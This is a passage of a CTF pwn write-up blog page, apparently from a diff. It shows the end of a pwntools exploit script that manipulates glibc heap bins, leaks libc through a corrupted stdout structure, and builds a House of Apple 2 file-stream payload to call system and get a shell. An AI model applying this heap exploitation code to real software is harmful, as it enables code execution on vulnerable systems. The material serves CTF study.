+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x10000</span>, <span style="color:#bd93f9">0x20</span> # need <span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> range(<span style="color:#bd93f9">7</span>)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        dele(<span style="color:#bd93f9">0x1f</span><span style="color:#ff79c6">-</span>i) # fill tcache first
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    # edit header to make tache great again
+</span></span><span style="display:flex;"><span>    # dele tcache first <span style="color:#ff79c6">in</span> order to just fix up header not pointer
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">5</span>, flat(
+</span></span><span style="display:flex;"><span>        b<span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x420</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x21</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">9</span>, flat(
+</span></span><span style="display:flex;"><span>        b<span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x2f0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x31</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    # fix up header
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">3</span>, flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x91</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">4</span>, flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x91</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    # dele unsorted_bin
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">6</span>) # dele unsorted_bin end
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">8</span>) # dele unsorted_bin middle
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">10</span>) # dele unsorted_bin start
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # overwrite the start fd lsb burp one <span style="color:#ff79c6">byte</span>
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">6</span>, flat(
+</span></span><span style="display:flex;"><span>        b<span style="color:#f1fa8c">&#39;\x80\xb0&#39;</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">8</span>)
+</span></span><span style="display:flex;"><span>    # end bk lsb
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">10</span>, flat(
+</span></span><span style="display:flex;"><span>        b<span style="color:#f1fa8c">&#39;\x80\xb0&#39;</span>
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">14</span>, <span style="color:#bd93f9">0xa0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    # stdout <span style="color:#bd93f9">0x15555541b780</span>  p <span style="color:#ff79c6">&amp;</span>_IO_2_1_stdout_
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>, flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>        b<span style="color:#f1fa8c">&#39;\x80\xb7&#39;</span>,
+</span></span><span style="display:flex;"><span>    ), <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    d()
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">15</span>, <span style="color:#bd93f9">0x28</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">15</span>,flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0xfbad1800</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,b<span style="color:#f1fa8c">&#39;\x00\x90&#39;</span>
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p.recvuntil(p64(<span style="color:#bd93f9">0x7fffffff00000001</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    leak_libc <span style="color:#ff79c6">=</span> u64(p.recv(<span style="color:#bd93f9">6</span>).ljust(<span style="color:#bd93f9">8</span>, b<span style="color:#f1fa8c">&#34;\x00&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#ff79c6">=</span> leak_libc <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1d807b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    success(hex(libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    #p _IO_2_1_stdout_ 
+</span></span><span style="display:flex;"><span>    # write_base <span style="color:#bd93f9">0x15555541b803</span>
+</span></span><span style="display:flex;"><span>    # write_ptr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # environ <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc.sym[<span style="color:#f1fa8c">&#39;__environ&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # house <span style="color:#ff79c6">of</span> apple
+</span></span><span style="display:flex;"><span>    write_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21c000</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x400</span>
+</span></span><span style="display:flex;"><span>    wfile_jumps <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x2170c0</span> <span style="color:#ff79c6">+</span> libc_base
+</span></span><span style="display:flex;"><span>    system_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc.sym[<span style="color:#f1fa8c">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>,flat(
+</span></span><span style="display:flex;"><span>        write_addr
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0x38</span>)
+</span></span><span style="display:flex;"><span>    # initial_quick<span style="color:#ff79c6">+</span><span style="color:#bd93f9">224</span> serve as the writeable addr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> house_of_apple2_all_in_one(wfile_jumps, write_addr, system_addr)
+</span></span><span style="display:flex;"><span>    success(payload)
+</span></span><span style="display:flex;"><span>    success(len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # block <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">16</span>, <span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">16</span>, payload[<span style="color:#ff79c6">:</span><span style="color:#bd93f9">0x80</span>],<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # block <span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>,flat(
+</span></span><span style="display:flex;"><span>        write_addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x80</span>
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0x38</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">17</span>, <span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">17</span>, payload[<span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span>], <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # block <span style="color:#bd93f9">3</span>
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>,flat(
+</span></span><span style="display:flex;"><span>        write_addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x80</span>
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0x38</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">18</span>, <span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">18</span>, payload[<span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span>], <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    # block <span style="color:#bd93f9">4</span>
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>,flat(
+</span></span><span style="display:flex;"><span>        write_addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x80</span>
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0x38</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">19</span>, <span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">19</span>, payload[<span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">4</span>], <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    #block <span style="color:#bd93f9">5</span> 
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>,flat(
+</span></span><span style="display:flex;"><span>        write_addr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x80</span>
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0x38</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">20</span>, <span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">20</span>, payload[<span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">:</span>], <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    #IO_list_all
+</span></span><span style="display:flex;"><span>    iolistall_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc.sym[<span style="color:#f1fa8c">&#39;_IO_list_all&#39;</span>]
+</span></span><span style="display:flex;"><span>    # success(hex(iolistall_addr))
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">14</span>,flat(
+</span></span><span style="display:flex;"><span>        iolistall_addr
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0x38</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">21</span>,<span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span>    edit(<span style="color:#bd93f9">21</span>,flat(
+</span></span><span style="display:flex;"><span>        write_addr
+</span></span><span style="display:flex;"><span>    ),<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    exit_()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    success(f<span style="color:#f1fa8c">&#34;write_addr:{hex(write_addr)}&#34;</span>)    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># gdb.attach(p)
+</span></span><span style="display:flex;"><span># pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># <span style="color:#ff79c6">while</span> True<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>#     <span style="color:#ff79c6">try</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>#         p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;./pwn&#34;</span> , aslr <span style="color:#ff79c6">=</span> False)
+</span></span><span style="display:flex;"><span>#         pwn()
+</span></span><span style="display:flex;"><span>#         p.interactive()
+</span></span><span style="display:flex;"><span>#         exit()
+</span></span><span style="display:flex;"><span>#     except KeyboardInterrupt<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>#         print(<span style="color:#f1fa8c">&#34;Exiting...&#34;</span>)
+</span></span><span style="display:flex;"><span>#         exit()
+</span></span><span style="display:flex;"><span>#     except<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>#         p.close()
+</span></span><span style="display:flex;"><span>#         <span style="color:#ff79c6">continue</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;./pwn&#34;</span>, aslr <span style="color:#ff79c6">=</span> False)
+</span></span><span style="display:flex;"><span>pwn()
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div><h1 id="参考">参考</h1>
+<p><a href="http://www.longque.xyz/index.php/archives/45/">http://www.longque.xyz/index.php/archives/45/</a></p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/wifi/" data-toggle="tooltip" data-placement="top" title="轻松改造你的寝室网络环境">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/course" title="course">
+                            course
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/crypto" title="crypto">
+                            crypto
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/notebook" title="notebook">
+                            notebook
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/writeup" title="writeup">
+                            writeup
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0" title="统计学习">
+                            统计学习
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2024
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
